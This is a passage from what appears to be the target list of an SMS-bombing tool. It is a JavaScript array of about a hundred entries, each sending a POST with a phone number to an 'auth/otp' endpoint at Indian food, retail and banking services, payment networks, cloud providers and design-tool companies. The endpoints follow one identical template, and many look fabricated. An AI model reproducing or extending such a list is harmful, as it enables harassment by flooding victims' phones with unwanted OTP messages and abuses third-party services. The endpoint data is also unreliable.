        'url': 'https://api.oyorooms.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MakeMyTrip_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.makemytrip.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Goibibo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.goibibo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BookMyShow_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bookmyshow.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'PVR_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pvrcinemas.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'INOX_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.inoxmovies.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Cinepolis_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.cinepolis.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BigBasket_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bigbasket.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Grofers_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.grofers.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zepto_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zepto.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Blinkit_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.blinkit.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Instamart_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.instamart.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Dunzo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.dunzo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Swiggy_Instamart_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.swiggy.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zomato_Pro_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zomato.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'EatSure_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.eatsure.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Faasos_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.faasos.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'KFC_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.kfc.co.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'McDonalds_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mcdonalds.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BurgerKing_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.burgerking.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Dominos_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.dominos.co.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'PizzaHut_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pizzahut.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TacoBell_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tacobell.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Subway_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.subway.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Starbucks_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.starbucks.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'CostaCoffee_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.costacoffee.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Barista_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.barista.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'HDFC_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hdfcbank.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ICICI_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.icicibank.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SBI_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sbi.co.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Axis_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.axisbank.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Kotak_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.kotakbank.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Yes_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.yesbank.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IndusInd_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.indusind.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RBL_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.rblbank.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'PNB_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pnb.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BOB_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bankofbaroda.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Canara_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.canarabank.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Union_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.unionbank.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IDFC_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.idfcbank.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Federal_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.federalbank.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'DBS_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.dbs.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'HSBC_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hsbc.co.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Citibank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.citibank.co.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'PayPal_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.paypal.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Venmo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.venmo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Stripe_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.stripe.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Razorpay_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.razorpay.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'CASHFREE_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.cashfree.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'PayU_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.payu.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BillDesk_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.billdesk.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'CCAvenue_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ccavenue.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Instamojo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.instamojo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'UPI_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.upi.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BHIM_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bhim.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NPCI_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.npci.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RuPay_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.rupay.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Visa_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.visa.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Mastercard_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mastercard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'AmericanExpress_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.americanexpress.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Discover_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.discover.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'DinersClub_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.dinersclub.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Google_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://cloud.google.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'AWS_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://aws.amazon.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Azure_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://azure.microsoft.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Oracle_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.oracle.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IBM_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ibm.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SAP_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sap.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Salesforce_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.salesforce.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'HubSpot_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hubspot.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zoho_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zoho.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Freshworks_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.freshworks.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ServiceNow_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.servicenow.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Atlassian_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.atlassian.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Slack_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.slack.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zoom_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zoom.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Microsoft_Teams_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.teams.microsoft.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Google_Meet_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.meet.google.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Cisco_Webex_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.webex.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Adobe_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.adobe.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Figma_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.figma.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Canva_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.canva.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Sketch_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sketch.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'InVision_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.invisionapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Marvel_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.marvelapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Proto.io_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.proto.io/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'UXPin_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.uxpin.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Balsamiq_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.balsamiq.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Axure_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.axure.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MockFlow_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mockflow.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Wireframe_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.wireframe.cc/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Mockplus_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mockplus.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'JustInMind_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.justinmind.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pidoco_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pidoco.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'HotGloo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hotgloo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'FluidUI_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.fluidui.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Framer_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.framer.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Origami_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.origami.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Principle_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.principle.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
